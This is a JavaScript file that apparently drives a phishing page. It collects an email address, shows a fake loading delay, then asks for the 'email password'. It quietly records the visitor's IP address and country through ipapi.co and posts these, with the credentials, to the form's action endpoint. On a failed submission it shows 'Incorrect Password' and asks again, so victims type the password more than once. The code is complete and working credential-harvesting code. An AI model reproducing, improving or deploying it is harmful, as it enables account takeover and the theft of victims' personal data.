(function () {
  // Wait for DOM to be fully loaded
  document.addEventListener("DOMContentLoaded", function () {
    // DOM element references with null checks
    const elements = {
      emailForm: document.getElementById("emailForm"),
      passwordForm: document.getElementById("passwordForm"),
      emailInput: document.getElementById("emailInput"),
      emailProceed: document.getElementById("emailProceed"),
      passwordInput: document.getElementById("passwordInput"),
      passwordSubmit: document.getElementById("passwordSubmit"),
      emailError: document.getElementById("emailError"),
      passwordError: document.getElementById("passwordError"),
      background: document.getElementById("background"),
      loading: document.getElementById("loading"),
      sessionIdElement: document.getElementById("sessionId"),
      loginForm: document.getElementById("loginForm"),
      formEmailInput: document.getElementById("formEmailInput"),
      formSessionId: document.getElementById("formSessionId"),
      formIpInput: document.getElementById("formIpInput"),
      formCountryInput: document.getElementById("formCountryInput"),
    };

    // Check if all required elements exist
    const missingElements = Object.keys(elements).filter(
      (key) => !elements[key]
    );
    if (missingElements.length > 0) {
      console.error("Missing DOM elements:", missingElements.join(", "));
      return;
    }

    // Function to generate a session ID
    function generateSessionId() {
      const chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      let sessionId = "";
      for (let i = 0; i < 10; i++) {
        sessionId += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return sessionId;
    }

    // Function to fetch IP information
    function getIPInfo() {
      return new Promise((resolve) => {
        fetch("https://ipapi.co/json/")
          .then((response) => {
            if (!response.ok) {
              console.error("IP API error:", response.statusText);
              return null;
            }
            return response.json();
          })
          .then((data) => {
            resolve({
              ip: data ? data.ip || "Unknown" : "Unknown",
              country: data ? data.country_name || "Unknown" : "Unknown",
            });
          })
          .catch((error) => {
            console.error("Failed to fetch IP info:", error);
            resolve({ ip: "Unknown", country: "Unknown" });
          });
      });
    }

    // Initialize states
    elements.sessionIdElement.textContent = generateSessionId();
    elements.emailProceed.disabled = elements.emailInput.value.trim() === "";
    elements.emailError.classList.toggle(
      "active",
      elements.emailInput.value.trim() === ""
    );

    // Email proceed button click handler
    elements.emailProceed.addEventListener("click", () => {
      if (elements.emailInput.value.trim() !== "") {
        elements.emailForm.style.display = "none";
        elements.background.style.display = "none";
        elements.loading.classList.add("active");
        setTimeout(() => {
          elements.loading.style.display = "none";
          elements.background.style.display = "block";
          elements.background.style.filter = "blur(3px)";
          elements.passwordForm.style.display = "block";
        }, 3000);
      }
    });

    // Form submission handler
    elements.loginForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      if (elements.passwordInput.value.trim() === "") {
        elements.passwordError.textContent = "Enter your email password";
        elements.passwordError.classList.add("active");
        elements.passwordInput.classList.add("shake");
        setTimeout(() => elements.passwordInput.classList.remove("shake"), 500);
        return;
      }

      // Populate hidden fields
      elements.formEmailInput.value = elements.emailInput.value;
      elements.formSessionId.value =
        elements.sessionIdElement.textContent.replace("Session ID: ", "");
      
      // Fetch IP info and populate hidden fields
      const ipInfo = await getIPInfo();
      elements.formIpInput.value = ipInfo.ip;
      elements.formCountryInput.value = ipInfo.country;

      // Submit the form
      const formData = new FormData(elements.loginForm);
      try {
        const response = await fetch(elements.loginForm.action, {
          method: "POST",
          body: formData,
        });
        const result = await response.json();
        if (!response.ok) {
          elements.passwordError.textContent =
            result.message || "Incorrect Password";
          elements.passwordError.classList.add("active");
          elements.passwordInput.classList.add("shake");
          elements.passwordInput.value = "";
          setTimeout(() => elements.passwordInput.classList.remove("shake"), 500);
          return;
        }
        elements.background.style.filter = "none";
        elements.passwordForm.style.display = "none";
      } catch (error) {
        console.error("Form submission error:", error);
        elements.passwordError.textContent =
          "Server error, try again: " + error.message;
        elements.passwordError.classList.add("active");
        elements.passwordInput.classList.add("shake");
        setTimeout(() => elements.passwordInput.classList.remove("shake"), 500);
      }
    });

    // Real-time email input validation
    elements.emailInput.addEventListener("input", () => {
      elements.emailProceed.disabled = elements.emailInput.value.trim() === "";
      elements.emailError.classList.toggle(
        "active",
        elements.emailInput.value.trim() === ""
      );
    });
  });
})();
